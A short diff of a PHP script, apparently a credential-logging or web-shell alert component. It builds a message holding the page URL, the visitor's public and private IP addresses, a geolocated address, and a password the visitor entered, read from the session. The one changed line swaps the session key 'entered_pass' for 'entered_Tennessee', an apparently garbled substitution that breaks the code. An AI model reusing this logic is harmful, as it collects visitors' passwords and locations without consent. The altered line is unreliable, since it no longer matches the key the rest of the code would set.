@@ -111,7 +111,7 @@ if ($location_data && $location_data['status'] === 'success') {
     $address = "Alamat tidak ditemukan";
 }
 
-$password_input = isset($_SESSION['entered_pass']) ? $_SESSION['entered_pass'] : 'No Input';
+$password_input = isset($_SESSION['entered_Tennessee']) ? $_SESSION['entered_Tennessee'] : 'No Input';
 
 $pesan_alert2 = "URL : $x_path
 IP Address : [ $ip_public - Public ] / [ $ip_internal - Private ]
